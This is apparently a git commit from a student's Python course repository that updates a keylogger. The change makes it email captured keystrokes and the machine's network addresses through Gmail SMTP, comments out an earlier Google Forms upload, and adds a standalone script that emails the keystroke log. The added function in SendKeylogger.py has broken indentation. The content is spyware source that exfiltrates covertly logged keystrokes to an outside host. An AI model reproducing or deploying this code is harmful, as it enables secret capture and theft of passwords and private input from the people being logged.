2952510b665c01910fe9485857d7c32e660d9fc5
Istelly <111928746+Istelly@users.noreply.github.com>
2022-11-29 02:46:00 +0300

    update

--- Python_Learning/SendKeylogger.py
+++ Python_Learning/SendKeylogger.py
@@ -4,18 +4,37 @@ import requests
 import time
 import os 
 from pynput.keyboard import Listener
+import smtplib
+from email.message import EmailMessage
+import config
 
 startlog = time.time()
 
-os.system("python3 /home/student/ITP270_001N_FALL2022/Python_Learning/keylogger.py & ")
+os.system("(python3 /home/student/ITP270_001N_FALL2022/Python_Learning/keylogger.py &) ; (ifconfig | grep -w 'inet' >> keyboard_Input.txt &") 
 time.sleep(1)
 
 def send_request():
-    form_input = open("/home/student/ITP270_001N_FALL2022/Python_Learning/keyboard_Input.txt")
-    form_send = form_input.read()
-    url = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSd63z5rAVie4clZ-PttFpHwCUJuhBeU6cCIbgsPGiZqbOz19g/formResponse'
-    form_data = {'entry.839337160' : f"'{form_send}'"}
-    r = requests.post(url, data=form_data)
+    #form_input = open("/home/student/ITP270_001N_FALL2022/Python_Learning/keyboard_Input.txt")
+    #form_send = form_input.read()
+    #url = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSd63z5rAVie4clZ-PttFpHwCUJuhBeU6cCIbgsPGiZqbOz19g/formResponse'
+    #form_data = {'entry.839337160' : f"'{form_send}'"}
+    #r = requests.post(url, data=form_data)
+    with open('keyboard_Input.txt') as msgcontent:
+    msg = EmailMessage()
+    msg.set_content(msgcontent.read())
+    try:
+        msg['Subject'] = f'The contents of {"keyboard_Input.txt"}'
+        msg['From'] = 'ims2324@email.vccs.edu'
+        msg['To'] = 'ims2324@email.vccs.edu'
+        server = smtplib.SMTP('smtp.gmail.com:587')
+        server.ehlo()
+        server.starttls()
+        server.login(config.EMAIL_ADDRESS, config.PASSWORD)
+        server.send_message(msg)
+        server.quit()
+    except:
+        pass
+
 
 def interval():
     global startlog
--- Python_Learning/emailkeylogger.py
+++ Python_Learning/emailkeylogger.py
@@ -1,1 +1,19 @@
+#!/bin/python3
 
+import smtplib
+from email.message import EmailMessage
+import config
+
+with open('keyboard_Input.txt') as msgcontent:
+    msg = EmailMessage()
+    msg.set_content(msgcontent.read())
+
+msg['Subject'] = f'The contents of {"keyboard_Input.txt"}'
+msg['From'] = 'ims2324@email.vccs.edu'
+msg['To'] = 'ims2324@email.vccs.edu'
+server = smtplib.SMTP('smtp.gmail.com:587')
+server.ehlo()
+server.starttls()
+server.login(config.EMAIL_ADDRESS, config.PASSWORD)
+server.send_message(msg)
+server.quit()
